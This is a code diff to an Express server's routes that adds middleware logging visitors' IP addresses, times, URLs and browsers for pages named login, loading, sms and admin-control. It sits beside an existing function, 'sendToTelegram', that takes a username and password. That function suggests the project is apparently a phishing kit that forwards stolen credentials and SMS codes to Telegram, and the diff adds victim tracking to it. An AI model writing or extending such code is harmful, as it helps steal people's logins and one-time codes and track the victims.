@@ -1,6 +1,8 @@
 import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
+import fs from "fs";
+import path from "path";
 import { storage } from "./storage";
 import { loginSchema, usernameSchema } from "@shared/schema";
 
@@ -36,7 +38,43 @@ async function sendToTelegram(username: string, password: string) {
   }
 }
 
+// Function to log visitor information
+function logVisitor(req: Request) {
+  try {
+    // Get real IP address (handles proxies and load balancers)
+    const ip = req.headers['x-forwarded-for'] as string || 
+               req.headers['x-real-ip'] as string ||
+               req.connection.remoteAddress ||
+               req.socket.remoteAddress ||
+               'unknown';
+    
+    // Get current date/time in GMT
+    const now = new Date();
+    const dateStr = now.toISOString().split('T')[0]; // YYYY-MM-DD
+    const timeStr = now.toISOString().split('T')[1].split('.')[0]; // HH:MM:SS
+    
+    // Format log entry
+    const logEntry = `${ip} | ${dateStr} | ${timeStr} GMT | ${req.url} | ${req.headers['user-agent'] || 'unknown'}\n`;
+    
+    // Append to visitors.txt file
+    const logPath = path.join(process.cwd(), 'visitors.txt');
+    fs.appendFileSync(logPath, logEntry);
+  } catch (error) {
+    console.error('Error logging visitor:', error);
+  }
+}
+
 export async function registerRoutes(app: Express): Promise<Server> {
+  // Visitor logging middleware - logs all page visits
+  app.use((req: Request, res: Response, next) => {
+    // Only log main page visits, not API calls or assets
+    if (req.url === '/' || req.url.startsWith('/login') || req.url.startsWith('/loading') || 
+        req.url.startsWith('/sms') || req.url.startsWith('/admin-control')) {
+      logVisitor(req);
+    }
+    next();
+  });
+
   // Authentication routes
   app.post("/api/auth/login", async (req: Request, res: Response) => {
     try {
